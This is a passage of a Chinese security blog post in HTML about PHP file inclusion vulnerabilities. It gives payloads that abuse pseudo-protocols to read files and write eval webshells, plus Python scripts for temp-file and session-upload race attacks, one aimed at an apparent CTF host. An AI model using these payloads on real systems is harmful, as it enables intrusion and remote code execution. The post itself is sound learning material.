@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="简介所谓文件包含漏洞就是指,后端代码使用了一些文件包含的函数,如果用户能控制这些函数的参数,就可以实现任意代码读取,getshell,命令执行等多种攻击手段文件包含漏洞可以简单的分为本地文件包含和远程文件包含,本质上没有区别,开发人员应该尽可能的避免用户控制文件包含函数的参数,或是进行严格的过滤 php各种伪协议的利用 什么是php的伪协议PHP伪协议是指PHP支持的一些特殊的协议，它们可以用来访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞的学习">
+<meta property="og:url" content="http://example.com/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="睡猫的博客">
+<meta property="og:description" content="简介所谓文件包含漏洞就是指,后端代码使用了一些文件包含的函数,如果用户能控制这些函数的参数,就可以实现任意代码读取,getshell,命令执行等多种攻击手段文件包含漏洞可以简单的分为本地文件包含和远程文件包含,本质上没有区别,开发人员应该尽可能的避免用户控制文件包含函数的参数,或是进行严格的过滤 php各种伪协议的利用 什么是php的伪协议PHP伪协议是指PHP支持的一些特殊的协议，它们可以用来访">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230505160603.png">
+<meta property="article:published_time" content="2023-05-04T12:58:52.000Z">
+<meta property="article:modified_time" content="2023-05-09T13:15:02.763Z">
+<meta property="article:author" content="？？喵！！">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Hacker">
+<meta property="article:tag" content="include漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230505160603.png">
+
+<link rel="canonical" href="http://example.com/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件包含漏洞的学习 | 睡猫的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">睡猫的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享代码，记录生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含漏洞的学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-04 20:58:52" itemprop="dateCreated datePublished" datetime="2023-05-04T20:58:52+08:00">2023-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-09 21:15:02" itemprop="dateModified" datetime="2023-05-09T21:15:02+08:00">2023-05-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>28 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>所谓文件包含漏洞就是指,后端代码使用了一些文件包含的函数,如果用户能控制这些函数的参数,就可以实现<strong>任意代码读取</strong>,<strong>getshell</strong>,<strong>命令执行</strong>等多种攻击手段<br>文件包含漏洞可以简单的分为<strong>本地文件包含</strong>和<strong>远程文件包含</strong>,本质上没有区别,开发人员应该尽可能的避免用户控制文件包含函数的参数,或是进行严格的过滤</p>
+<h2 id="php各种伪协议的利用"><a href="#php各种伪协议的利用" class="headerlink" title="php各种伪协议的利用"></a>php各种伪协议的利用</h2><ol>
+<li><p><strong>什么是php的伪协议</strong><br>PHP伪协议是指PHP支持的一些特殊的协议，它们可以用来访问各种<code>输入/输出流</code>、内存中的临时文件流以及其他读取写入文件资源的过滤器。PHP支持多种伪协议，包括 <code>file://、http://、ftp://、php://、zlib://、data://、glob://、phar://、ssh2://、rar:// 和 ogg:// </code>等。</p>
+</li>
+<li><p><strong>伪协议的安全问题</strong><br>伪协议通常配合文件包含漏洞一起利用。文件包含的函数有<code>include()</code>, <code>include_once()</code>,<code>require()</code>,<code>require_once()</code>等等.文件包含本身存在的问题是,无论包含的是什么后缀的文件,都会被当成php文件解析,这在<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#%E5%9B%BE%E7%89%87%E9%A9%AC">文件上传</a>中已经有利用过,如果我们能控制文件包含函数的参数,配合伪协议,能实现更多攻击手段</p>
+</li>
+<li><p><strong>可以利用的伪协议</strong><br>下面介绍六种可能会导致安全问题的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter</span><br><span class="line">php://input</span><br><span class="line">file:// </span><br><span class="line">data:// </span><br><span class="line">zip:// </span><br><span class="line">phar:// </span><br></pre></td></tr></table></figure>
+<p>可能导致文件包含的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include和require函数</span><br><span class="line">include和include_once</span><br><span class="line">highlight_file()和show_source()</span><br><span class="line">readfile和file_get_contents和file</span><br><span class="line">file_put_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure>
+<p>使用PHP伪协议可能会导致安全风险，因此应谨慎使用。为了防止潜在的安全威胁，可以将<code>allow_url_include</code>配置选项设置为<code>off</code>，这样就限制无法包含远程文件了,需要注意的是，从<code>PHP5.2</code>开始,allow_url_include默认为Off。</p>
+<p><code>allow_url_fopen</code>是一个PHP配置选项，它控制PHP是否可以使用文件函数（如fopen，file_get_contents和include 来访问URL对象（如HTTP和FTP资源）。allow_url_fopen默认都是on。</p>
+</li>
+</ol>
+<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。简单来说,就是作为一个中间的代理,将读入或者写入的数据按照规定参数进行过滤或处理后输出<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230505160603.png"><br>第四点告诉了我们其实<code>read</code>和<code>write</code>是可以省略的<br>我们可以通过不同参数对读入写入的数据进行不同的处理,这里介绍几个可能导致危险的参数</p>
+<ol>
+<li><p><strong>convert.base64-encode</strong><br>作用是对数据流进行<code>base64</code>编码,如果不对数据进行编码的话,那所包含的文件就会被当成代码执行,不会输出结果,但编码后,就可以对任意文件进行读取,可以通过这个方式读取源码,然后进一步白盒审计<br>payload:  <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+</li>
+<li><p><strong>convert.base64-decode</strong><br>作用是对数据流<code>base64</code>解码,利用这个过滤器,可以实现对<strong>死亡exit</strong>的绕过<br>死亡exit指的是在进行写入PHP文件操作时，执行了类似以下函数<br><code>file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);</code><br>这样一来无论我们想要写入什么内容,都会在开头被拼接插上<code>exit()</code>,导致强行终止<br>为什么使用base64解码可以绕过呢,base64只能识别64个可打印字符(大写字母,小写字母,数字,加号(+)和斜杠(&#x2F;)),遇到其他不属于base64字符集的字符时,会跳过这些字符,而不是停止解码<br>例如被插入了<code>&lt;?php exit()?&gt;</code>,解码只能识别其中的<code>phpexit</code>,其他会被跳过<br>因为base64解码是四个字符为一组进行解码,所以我们只需要将前面无用的内容凑出四的倍数,比如<code>phpexito</code>再将已经编码好的一句话木马写在后面,这样进行解码的时候就会将前面的死亡exit绕过,同时解码一句话木马<br>pyload:<br><code>txt=QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
+</li>
+<li><p><strong>string.strip_tags</strong><br>用来处理掉读入的所有标签，例如XML,HTML注释和PHP标签也会被去除。(PHP4, PHP5, PHP7)（自PHP7.3.0起已弃用此功能。）<br>由于<code>&lt;?php exit; ?&gt;</code>,实际上这是一个XML标签,所以我们可以通过string.strip_tags过滤器将这个死亡exit去除,但是我们要写入的一句话木马也会被去除,所以我们可以先将一句话木马进行编码,利用过滤器可以叠加的特性,先去除死亡exit,再将一句话木马还原<br>payload:<br><code>php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
+</li>
+</ol>
+<h3 id="php-x2F-x2F-input-伪协议"><a href="#php-x2F-x2F-input-伪协议" class="headerlink" title="php:&#x2F;&#x2F;input 伪协议"></a>php:&#x2F;&#x2F;input 伪协议</h3><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on/off</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
+<p>php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。它可以读取POST请求的参数<br>简单来说,它与使用$_POST变量来获取POST参数类似，但是php:&#x2F;&#x2F;input提供了更多的灵活性。<br>例如使用eval()函数来执行从php:&#x2F;&#x2F;input获取的数据,就可以导致任意代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上面的代码中，攻击者可以使用如下 URL 来执行恶意代码：<br><code>http://www.example.com/index.php?file=php://input</code><br>当用户访问上面的 URL 时，服务器会读取请求正文中的数据，并将其作为PHP代码执行。因此，攻击者可以在请求正文中发送恶意代码，从而在服务器上执行任意命令。</p>
+<h3 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h3><p>用于访问本地文件系统,允许攻击者读取本地文件系统中的文件。这个伪协议通常用于读取敏感文件，例如配置文件或数据库凭据。需要注意的是,<code>file://</code> 后面必须跟着是本地的绝对路径,不允许是相对路径,或是远程文件</p>
+<h3 id="data-x2F-x2F-伪协议"><a href="#data-x2F-x2F-伪协议" class="headerlink" title="data:&#x2F;&#x2F; 伪协议"></a>data:&#x2F;&#x2F; 伪协议</h3><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
+<p>data:&#x2F;&#x2F;伪协议是数据流封装器，传递相应格式的数据<br><code>data://</code> 伪协议的语法如下：<br><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>如果使用include()或require()函数来包含从用户输入中获取的<code>data://</code>， 通常可以用来执行PHP代码。<br>payload:<br><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code><br><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
+<h3 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F; 伪协议"></a>zip:&#x2F;&#x2F; 伪协议</h3><p><code>zip://</code>伪协议属于压缩流，可以访问压缩文件中的子文件(相同的类型的还有<code>zlib://</code>和<code>bzip2://</code>)<br>语法  <code>zip:// [压缩文件绝对路径] # [压缩文件内的子文件名]</code><br>例如  有一个<code>myzip.zip</code>的压缩文件，其中包含一个名为<code>myfile.txt</code>的文件，可以使用以下语法访问该文件：<code>zip://myzip.zip#myfile.txt</code>(要是在URL中<code>#</code>要写成<code>%23</code>)<br>此外这个伪协议也可以配合文件上传漏洞使用,如果攻击者能够上传一个包含恶意PHP代码的zip文件，并且能够控制包含函数的参数，那么他们就可以使用zip:&#x2F;&#x2F;伪协议来执行恶意代码。<br><strong>payload</strong><br><code>?file=zip://evil.zip#shell.php</code><br>注意 这个伪协议对后缀不敏感,所以可以将先将文件压缩为zip,再将后缀改成jpg,然后<br><code>?file=zip://evil.jpg#shell.php</code></p>
+<h3 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F; 伪协议"></a>phar:&#x2F;&#x2F; 伪协议</h3><p><code>phar://</code>伪协议和<code>zip://</code>伪协议类似,phar本身就是php中压缩文件的一种形式,所以可以通过phar:&#x2F;&#x2F;访问zip压缩文件中的子文件(注:php版本大于等于5.3.0，压缩包只能是zip协议压缩)<br>语法  <code>phar:// [压缩文件绝对路径] / [压缩文件内的子文件名]</code><br><strong>payload</strong><br><code>?file=phar://evil.zip/shell.php</code></p>
+<p>更重要的是,phar:&#x2F;&#x2F;伪协议可以配合<strong>反序列化漏洞</strong>,用伪协议配合一些危险函数可以触发phar文件中的元数据的反序列化<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">phar反序列化漏洞</a></p>
+<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line">版本要求：</span><br><span class="line">php7.0.0-7.1.2</span><br><span class="line">php7.1.3-7.2.1</span><br><span class="line">php7.2.2-7.2.8</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">版本要求：</span><br><span class="line">php&lt;=5.6.38</span><br><span class="line">php7.0.0-7.0.32</span><br><span class="line">php7.0.4-7.2.12</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>什么是临时文件</strong><br>临时文件是计算机系统在执行某些操作时创建的文件，用于存储临时数据。这些文件通常在操作完成后被删除，但有时它们可能会遗留在系统中。<br>一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要HTTP请求中存在文件，那么就会被保存为临时文件，当前HTTP请求处理完成后，垃圾回收机制会自动删除临时文件。</li>
+<li><strong>怎么利用</strong><br>临时文件的存储位置取决于操作系统和应用程序。在Windows操作系统中，临时文件通常存储在<code>C:\Windows\Temp</code>和<code>C:\Users\[用户名]\AppData\Local\Temp</code>目录下。在Linux和macOS操作系统中，临时文件通常存储在<code>/tmp</code>目录下,如果我们能知道文件最后保存的名字,就可以配合文件包含功能,上传我们想要的代码.<br>php7 segment fault特性：如果我们向后端发送大量文件,就会导致php崩溃,这时最后发送的文件就会被保留在临时文件中,我们利用文件包含漏洞包含这个临时文件,就可以实现这个文件的代码<br><strong>payload:</strong><br><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code><br>python脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;具有文件包含漏洞的网址?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">phpfile=<span class="string">&quot;&lt;?php  @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>   <span class="comment">#phpfile对应的就是上传的文件的内容</span></span><br><span class="line">filedata=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:phpfile</span><br><span class="line">&#125;</span><br><span class="line">bak=res.post(url=url,files=filedata)</span><br><span class="line"><span class="built_in">print</span>(bak.text)  <span class="comment">#最后输出网站奔溃,说明临时文件保存成功</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>Session 文件包含漏洞是一种利用条件竞争漏洞的攻击方法。它利用了服务器在处理文件上传时，可能会执行恶意代码的漏洞。攻击者可以通过控制 session 文件中的内容，传入恶意代码，然后通过文件包含漏洞来执行恶意代码。为了成功利用这个漏洞，需要知道服务器存储<code>session文件的存储位置</code>和<code>文件名格式</code>。<br>与session文件包含有关的配置,以及默认情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">session.save_path：</span><br><span class="line">默认情况下，可能设置为系统的临时目录，例如 Linux/Unix 系统上的 /tmp 目录。(我们可以采用phpinfo()来查看)</span><br><span class="line"></span><br><span class="line">session.name：默认值为 PHPSESSID,配置选项用于定义表单中用于报告上传进度的字段的名称,最大的好处是，它的值可控。</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup:  默认为on,开启后 PHP 在文件上传结束后立即清空对应会话文件中的内容。(如果这个选项为on,意味着我们需要条件竞争)</span><br><span class="line"></span><br><span class="line">session.cookie_secure：默认值为 0，表示会话 cookie 可以通过非安全连接（如 HTTP）传输。</span><br><span class="line"></span><br><span class="line">session.use_only_cookies：默认值为 1，表示仅使用 cookie 来存储会话 ID。</span><br><span class="line"></span><br><span class="line">session.auto_start:  </span><br><span class="line">默认情况下，这个选项都是关闭的。开启后则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。</span><br><span class="line"></span><br><span class="line">session.use_strict_mode：</span><br><span class="line">默认值为 0，设置为 0 以允许用户自定义会话 ID。例如，用户可以在 cookie 中设置 PHPSESSID=TGAO，则 PHP 将在服务器上创建一个名为 /tmp/sess_TGAO 的文件。即使用户没有初始化会话，PHP 也会自动初始化会话。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>放一个别人写的多线程python脚本,<a target="_blank" rel="noopener" href="https://www.cnblogs.com/TTaly/p/16934584.html">原文连接</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">parameter = <span class="string">&quot;QAQ&quot;</span>  <span class="comment"># 参数名称</span></span><br><span class="line">url = <span class="string">&quot;http://43.143.7.97:28098/&quot;</span>  <span class="comment"># 修改url地址</span></span><br><span class="line">catalogue = <span class="string">&quot;/tmp&quot;</span>  <span class="comment"># 存放session文件的目录</span></span><br><span class="line">data = &#123;<span class="string">&quot;aaa&quot;</span>: <span class="string">&quot;system(&#x27;cat /var/ffflllaaagggflag&#x27;);&quot;</span>&#125;  <span class="comment"># 执行的命令</span></span><br><span class="line">filename = <span class="string">&quot;test.txt&quot;</span>  <span class="comment"># 上传的文件名  要上传文件 它会携带者PHP_SESSION_UPLOAD_PROGRESS发送  而且会存储到sess_id文件里面</span></span><br><span class="line">sess_id = <span class="string">&quot;abc&quot;</span>  <span class="comment"># sess拼接的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;sess_id&#125;</span>&lt;?php eval($_POST[aaa]);?&gt;<span class="subst">&#123;sess_id&#125;</span>&quot;</span>&#125;</span><br><span class="line">        cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: sess_id&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (filename, f)&#125;</span><br><span class="line">        session.post(url=url, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?<span class="subst">&#123;parameter&#125;</span>=<span class="subst">&#123;catalogue&#125;</span>/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span 